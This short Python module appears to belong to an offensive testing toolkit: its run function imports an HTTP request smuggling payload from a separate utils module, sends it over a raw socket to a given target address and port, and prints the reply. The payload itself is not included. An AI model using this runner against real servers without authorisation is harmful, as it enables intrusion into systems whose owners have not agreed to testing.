import socket
from utils.payloads import get_smuggling_payload

def run(target_ip, target_port):
    print("[*] Running HTTP smuggling attack...")

    smuggle_payload = get_smuggling_payload()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(smuggle_payload)
        response = s.recv(4096)
        print("[+] Received response:")
        print(response.decode(errors="ignore"))
